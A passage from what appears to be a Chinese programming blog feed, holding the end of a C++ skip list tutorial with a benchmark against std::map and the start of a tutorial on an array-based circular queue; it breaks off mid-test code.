skipNode&lt;KeyType,ValueType&gt;*[m_maxLevel];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尾节点内存分配类似<code>malloc(0)</code>形式</p>
<h4 id="skiplist查找-find和search"><a href="#skiplist查找-find和search" class="headerlink" title="skiplist查找 find和search"></a>skiplist查找 find和search</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">skipNode</span>&lt;KeyType,ValueType&gt;* <span class="title">skiplist</span>&lt;KeyType,ValueType&gt;:</span>:search(<span class="keyword">const</span> KeyType&amp;key)&#123;</span><br><span class="line">    skipNode&lt;KeyType,ValueType&gt;*forwardNode=m_headNode;</span><br><span class="line">    <span class="comment">// 外层循环: 不断的指向下一层级链表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m_curMaxLevel<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">        <span class="comment">// 内层循环: 指向当前层级链表的邻接节点</span></span><br><span class="line">        <span class="keyword">while</span> (forwardNode-&gt;next[i]!=m_tailNode&amp;&amp;forwardNode-&gt;next[i]-&gt;element.key&lt;key)&#123;</span><br><span class="line">            forwardNode=forwardNode-&gt;next[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保存前驱节点指针</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;m_forwardNodes[i]=forwardNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> forwardNode-&gt;next[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">Element</span>&lt;KeyType,ValueType&gt;* <span class="title">skiplist</span>&lt;KeyType,ValueType&gt;:</span>:find(<span class="keyword">const</span> KeyType&amp;key)&#123;</span><br><span class="line">    <span class="keyword">if</span>(key &gt; <span class="keyword">this</span>-&gt;m_tailKey)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    skipNode&lt;KeyType,ValueType&gt;*forwardNode=m_headNode;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m_curMaxLevel<span class="number">-1</span>; i &gt;=<span class="number">0</span> ; --i)&#123;</span><br><span class="line">        <span class="keyword">while</span> (forwardNode-&gt;next[i]!=m_tailNode &amp;&amp; forwardNode-&gt;next[i]-&gt;element.key &lt; key)&#123;</span><br><span class="line">            forwardNode=forwardNode-&gt;next[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最终会遍历到第0层-&gt;原始层，只需要在第0层判断即可</span></span><br><span class="line">    <span class="keyword">if</span>(forwardNode-&gt;next[<span class="number">0</span>]-&gt;element.key==key)&#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;forwardNode-&gt;next[<span class="number">0</span>]-&gt;element;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>find</code>和<code>search</code>都是从当前最大层级依次向下遍历，不同的是，<code>search</code>在遍历的同时将每次遍历到每一层的<code>前驱节点</code>保存在<code>m_forwardNodes</code>中，目的是为了衔接后面的插入/删除节点</p>
<p><img src="/uploads/images/data_structure/skiplist_cpp/04.png" alt></p>
<p>其中的 <code>forwardNode-&gt;next[0]</code> 就是下一个要查找的节点(如果存在的话)</p>
<h4 id="skiplist插入"><a href="#skiplist插入" class="headerlink" title="skiplist插入"></a>skiplist插入</h4><p>每一次插入，需要通过<code>search</code>保存 <code>前驱节点m_forwardNodes</code> 从而将待插入节点连接起来。如下图红色箭头表示前后需要链接的节点<br><img src="/uploads/images/data_structure/skiplist_cpp/05.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">skiplist</span>&lt;KeyType,ValueType&gt;:</span>:insert(<span class="keyword">const</span> Element&lt;KeyType,ValueType&gt;&amp;element)&#123;</span><br><span class="line">    <span class="comment">// 随机生成索引节点层数 1&lt;=level&lt;=m_maxLevel</span></span><br><span class="line">    <span class="keyword">int</span> level=random_level();</span><br><span class="line">    <span class="keyword">if</span>(level &gt; <span class="keyword">this</span>-&gt;m_curMaxLevel)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_curMaxLevel=level;</span><br><span class="line">    &#125;</span><br><span class="line">    skipNode&lt;KeyType,ValueType&gt;*pNode=search(element.key);</span><br><span class="line">    <span class="comment">// 已经存在</span></span><br><span class="line">    <span class="keyword">if</span>(pNode-&gt;element.key==element.key)&#123;</span><br><span class="line">        pNode-&gt;element.value=element.value;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此时已经保存了合适的前驱节点m_forwardNodes</span></span><br><span class="line">    <span class="comment">// 创建一个具有level层的节点</span></span><br><span class="line">    skipNode&lt;KeyType,ValueType&gt;*pNewNode = <span class="keyword">new</span> skipNode&lt;KeyType,ValueType&gt;(element,level);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 建立索引节点</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = level<span class="number">-1</span>; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        pNewNode-&gt;next[i]=m_forwardNodes[i]-&gt;next[i];</span><br><span class="line">        m_forwardNodes[i]-&gt;next[i]=pNewNode;</span><br><span class="line">    &#125;</span><br><span class="line">    m_size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="skiplist删除"><a href="#skiplist删除" class="headerlink" title="skiplist删除"></a>skiplist删除</h4><p>删除操作类似插入操作，也需要通过<code>search</code>保存 <code>前驱节点m_forwardNodes</code><br><img src="/uploads/images/data_structure/skiplist_cpp/06.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">skiplist</span>&lt;KeyType,ValueType&gt;:</span>:erase(<span class="keyword">const</span> KeyType&amp;key)&#123;</span><br><span class="line">    <span class="comment">// 不符合的key</span></span><br><span class="line">    <span class="keyword">if</span>(key&gt;m_tailKey)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    skipNode&lt;KeyType,ValueType&gt;*pNode=search(key);</span><br><span class="line">    <span class="comment">// 不存在 </span></span><br><span class="line">    <span class="keyword">if</span>(pNode-&gt;element.key!=key)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 更新跳表链表结构</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m_curMaxLevel<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">        <span class="comment">// 此处 m_forwardNodes[i]-&gt;next[i] 可能不是 pNode</span></span><br><span class="line">        <span class="keyword">if</span>(m_forwardNodes[i]-&gt;next[i]==pNode)</span><br><span class="line">            m_forwardNodes[i]-&gt;next[i]=pNode-&gt;next[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 维护当前最大层级数</span></span><br><span class="line">    <span class="comment">// 当删除一个具有最大层级的节点时，可能会导致 m_headNode-&gt;next[m_maxLevel-1]=m_tailNode，那么此时需要降低层级</span></span><br><span class="line">    <span class="keyword">while</span> (m_curMaxLevel<span class="number">-1</span> &gt; <span class="number">0</span>&amp;&amp;m_headNode-&gt;next[m_curMaxLevel<span class="number">-1</span>]==m_tailNode)&#123;</span><br><span class="line">        m_curMaxLevel--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> pNode;   </span><br><span class="line">    m_size--;    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，删除节点后还要维护<code>m_curMaxLevel</code>使其不能太高<br><img src="/uploads/images/data_structure/skiplist_cpp/07.png" alt></p>
<h4 id="释放跳跃表"><a href="#释放跳跃表" class="headerlink" title="释放跳跃表"></a>释放跳跃表</h4><p>在析构函数中释放所有内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">skiplist</span>&lt;KeyType,ValueType&gt;:</span>:~skiplist()&#123;</span><br><span class="line">    <span class="keyword">while</span> (m_headNode!=m_tailNode)&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=m_headNode-&gt;next[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">delete</span> m_headNode;</span><br><span class="line">        m_headNode=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> m_tailNode;</span><br><span class="line">    <span class="keyword">delete</span> []m_forwardNodes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>用skiplist和STL map测试插入操作，仅供参考</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"skiplist.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ClockTest.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个无穷数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TAIL_INFINITY_KEY 0xffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">1000000</span>;</span><br><span class="line">    srand(time(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="comment">// 测试skiplist insert</span></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    skiplist&lt;int,int&gt; sk(0.5,TAIL_INFINITY_KEY,0,n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">        sk.insert(Element&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&#123;rand()%n,i&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> skiplist_insert_time=CClock::time_duration();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 测试map insert</span></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; mp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        mp.insert(pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;(rand()%n,i));</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> map_insert_time=CClock::time_duration();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 测试skiplist find</span></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        sk.find(rand()%n);</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> skip_find_time=CClock::time_duration();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试map find</span></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        mp.find(rand()%n);</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> map_find_time=CClock::time_duration();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 测试skiplist erase</span></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        sk.erase(rand()%n);</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> skip_erase_time=CClock::time_duration();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试map erase</span></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;=<span class="number">0</span>; --i)&#123;</span><br><span class="line">        mp.erase(rand()%n);</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> map_erase_time=CClock::time_duration();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"SkipList insert time: "</span>&lt;&lt;skiplist_insert_time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"SkipList find time: "</span>&lt;&lt;skip_find_time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"SkipList erase time: "</span>&lt;&lt;skip_erase_time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Map insert time: "</span>&lt;&lt;map_insert_time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Map find time: "</span>&lt;&lt;map_find_time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Map erase time: "</span>&lt;&lt;map_erase_time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"SkipList size: "</span>&lt;&lt;sk.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Map size: "</span>&lt;&lt;mp.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我机器上测试 随机插入/查找/删除，结果仅供参考。单位秒</p>
<table>
<thead>
<tr>
<th></th>
<th>insert</th>
<th>find</th>
<th>erase</th>
</tr>
</thead>
<tbody><tr>
<td>skiplist1</td>
<td>1.44737</td>
<td>2.03802</td>
<td>2.158</td>
</tr>
<tr>
<td>skiplist2</td>
<td>1.34377</td>
<td>1.61364</td>
<td>1.52145</td>
</tr>
<tr>
<td>skiplist3</td>
<td>1.35671</td>
<td>2.31105</td>
<td>1.57659</td>
</tr>
<tr>
<td>map1</td>
<td>1.48519</td>
<td>1.28156</td>
<td>1.93228</td>
</tr>
<tr>
<td>map2</td>
<td>1.00754</td>
<td>1.099</td>
<td>1.29245</td>
</tr>
<tr>
<td>map3</td>
<td>1.23837</td>
<td>1.28021</td>
<td>1.35214</td>
</tr>
</tbody></table>
<p>由此可见，跳跃表也是很高效的一种数据结构</p>
<p>skiplist源码地址: <a href="https://github.com/josexy/skiplist_c" target="_blank" rel="noopener">https://github.com/josexy/skiplist_c</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://en.wikipedia.org/wiki/Skip_list" target="_blank" rel="noopener">维基百科-skiplist</a><br><a href="https://www.cl.cam.ac.uk/teaching/0506/Algorithms/skiplists.pdf" target="_blank" rel="noopener">Skip Lists: A Probabilistic Alternative toBalanced Trees</a><br><a href="https://blog.csdn.net/ict2014/article/details/17394259" target="_blank" rel="noopener">浅析SkipList跳跃表原理及代码实现</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-队列</title>
    <url>/queue-cpp/</url>
    <content><![CDATA[<p>队列是一种先进先出(FIFO)的数据结构，与栈(后进先出LIFO)不同，但两者都是线性结构，因此可以用线性表去描述队列，本文主要是用数组去实现一个简单的队列</p>
<a id="more"></a>

<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>对一个队列操作，只能从队首删除元素，队尾插入元素，因此我们可以定义两个队列元素指针front,back，用于跟踪队列首尾元素。<br>C++ STL实现了队列数据结构，我们用时不可能立即手写一个队列，因而只需include头文件即可，不过对于队列这一数据结构原理还是要理解的</p>
<p>我们知道，队列可以用数组或链表实现，不过本文是以数组来讲述的因此较为简单</p>
<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>队列插入一个元素时，先将队尾指针back+1，使其指向下一个空闲区<br>域，然后在插入元素。复杂度为O(1)</p>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>删除队首元素有两种策略</p>
<ol>
<li>直接整个数组左移一位，front不变，back向前移动一位。复杂度O(n)</li>
<li>数组不移动，front移动到下一位，back不变。复杂度O(1)</li>
</ol>
<p>显然删除操作情况1不能接受，然而对于删除操作情况2，会导致数组空间浪费，这是因为front指针之前的区域未能被利用，而back指针之后的区域显然不够(这里在没有考虑数组变增的情况下)。</p>
<p>如果将数组“串”起来怎样？事实上确实可以，这种数组叫环形数组，用此类型数组实现的队列称为<strong>循环队列</strong> 且其插入删除复杂度均为O(1)</p>
<p>环形数组表示队列通过下面公式实现: </p>
<blockquote>
<p>location(i)=(location(front)+i)%arrayLength</p>
</blockquote>
<p>如下图一个空队列，此时 front=back<br><img src="/uploads/images/data_structure/queue_cpp/01.png" alt></p>
<p>当插入一个元素时，也有两种策略</p>
<blockquote>
<p>1.先移动back，后插入元素。那么front指向元素为”空”<br>2.先插入元素，后移动back。那么back指向元素为”空”</p>
</blockquote>
<img src="/uploads/images/data_structure/queue_cpp/02.png" width="70%" height="70%">

<p>每次插入都需要判断 (back+1)%size == front ，为什么？我们知道，初始时front=back表示空队列，那么当插入元素数量达到数组长度此时front=back！这表示这个队列满的还是空的？因此我们预留一个位置，也就是队列不能插满。即</p>
<blockquote>
<p>front=back  空队列<br>(back+1)%size = front 满队列</p>
</blockquote>
<img src="/uploads/images/data_structure/queue_cpp/03.png" width="70%" height="70%">

<p>如何获取队列中第n个元素在数组中的下标？<br>假设front=10，back=4。<br><img src="/uploads/images/data_structure/queue_cpp/04.png" width="70%" height="70%"></p>
<p>因此我们用C++实现该循环队列</p>
<h3 id="队列实现"><a href="#队列实现" class="headerlink" title="队列实现"></a>队列实现</h3><p>队列抽象数据类型</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">QueueBase</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~QueueBase()&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> T &amp;)</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">pop_front</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> T &amp; <span class="title">front</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> T &amp; <span class="title">back</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>之后在另外定义一个派生类继承QueueBase接口。<br>我是按照策略2来插入元素的，代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">arrayQueue</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T *m_array;</span><br><span class="line">    <span class="keyword">int</span> m_capacity;</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> back;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    arrayQueue(<span class="keyword">int</span> initCapacity=<span class="number">10</span>)&#123;</span><br><span class="line">        m_capacity=initCapacity;</span><br><span class="line">        m_array=<span class="keyword">new</span> T[m_capacity];</span><br><span class="line">        front=<span class="number">0</span>;</span><br><span class="line">        back=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~arrayQueue()&#123;<span class="keyword">delete</span> []m_array;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> T &amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop_front</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">T &amp; <span class="title">Front</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_array[front];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">T &amp; <span class="title">Back</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_array[back<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> front==back;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(front&lt;back)</span><br><span class="line">            <span class="keyword">return</span> back-front;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> back+m_capacity-front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">changeLength</span><span class="params">(T* &amp;,<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(empty())<span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 情况1</span></span><br><span class="line">        <span class="keyword">if</span>(front&lt;back)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = front; i &lt; back; i++)&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"["</span>&lt;&lt;i&lt;&lt;<span class="string">"] "</span>&lt;&lt;m_array[i]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// 情况2</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = front; i &lt; m_capacity; i++)&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"["</span>&lt;&lt;i&lt;&lt;<span class="string">"] "</span>&lt;&lt;m_array[i]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; back; i++)&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"["</span>&lt;&lt;i&lt;&lt;<span class="string">"] "</span>&lt;&lt;m_array[i]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">arrayQueue</span>&lt;T&gt;:</span>:push_back(<span class="keyword">const</span> T &amp;element)&#123;</span><br><span class="line">    <span class="comment">// 满队列</span></span><br><span class="line">    <span class="keyword">if</span>((back+<span class="number">1</span>)%m_capacity==front)&#123;</span><br><span class="line">        <span class="comment">// 数组倍增</span></span><br><span class="line">        changeLength(m_array,m_capacity,m_capacity*<span class="number">2</span>);</span><br><span class="line">        m_capacity*=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 按照策略2插入: 先插入元素，后移动back</span></span><br><span class="line">    m_array[back]=element;</span><br><span class="line">    <span class="comment">// 注意，此处不能直接 back++，这样做会使back超出数组长度从而导致数组访问越界</span></span><br><span class="line">    <span class="comment">// 相反，(back+1)%m_capacity 会使back指针回到数组起始处继续插入</span></span><br><span class="line">    back=(back+<span class="number">1</span>)%m_capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">arrayQueue</span>&lt;T&gt;:</span>:pop_front()&#123;</span><br><span class="line">    <span class="comment">// 判空</span></span><br><span class="line">    <span class="keyword">if</span>(back==front)<span class="keyword">return</span>;</span><br><span class="line">    m_array[front].~T();</span><br><span class="line">    <span class="comment">// 同样这里也是控制front只能处于数组之间</span></span><br><span class="line">    front=(front+<span class="number">1</span>)%<span class="keyword">this</span>-&gt;m_capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">arrayQueue</span>&lt;T&gt;:</span>:changeLength(T* &amp;<span class="built_in">array</span>,<span class="keyword">int</span> oldLength,<span class="keyword">int</span> newLength)&#123;</span><br><span class="line">    <span class="keyword">if</span>(newLength&lt;<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    T* temp=<span class="keyword">new</span> T[newLength];</span><br><span class="line">    <span class="comment">// 从有效元素开始复制</span></span><br><span class="line">    <span class="keyword">if</span>(front&lt;back)</span><br><span class="line">        <span class="comment">// 没有形成环</span></span><br><span class="line">        <span class="built_in">std</span>::copy(<span class="built_in">array</span>+front,<span class="built_in">array</span>+back,temp);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 形成环</span></span><br><span class="line">        <span class="built_in">std</span>::copy(<span class="built_in">array</span>+front,<span class="built_in">array</span>+oldLength,temp);</span><br><span class="line">        <span class="built_in">std</span>::copy(<span class="built_in">array</span>,<span class="built_in">array</span>+back,temp+oldLength-front);</span><br><span class="line">        <span class="comment">// 重新设置front,back</span></span><br><span class="line">        front=<span class="number">0</span>;</span><br><span class="line">        back=oldLength<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> []<span class="built_in">array</span>;</span><br><span class="line">    <span class="built_in">array</span>=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我认为比较难理解的是changeLength改变数组长度函数，其实用一张图表示就很简单了</p>
<img src="/uploads/images/data_structure/queue_cpp/05.png" width="70%" height="70%">


<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    arrayQueue&lt;<span class="keyword">int</span>&gt;q(<span class="number">5</span>);</span><br><span class="line">    q.push_back(<span class="number">1</span>);</span><br><span class="line">    q.push_back(<span class="number">2</span>);</span><br><span class="line">    q.push_back(<span class="number">3</span>);</span><br><span class="line">    q.push_back(<span class="number">4</span>);</span><br><span class="line">    q.push_back(<span class="number">40</span>);</span><br><span class="line">    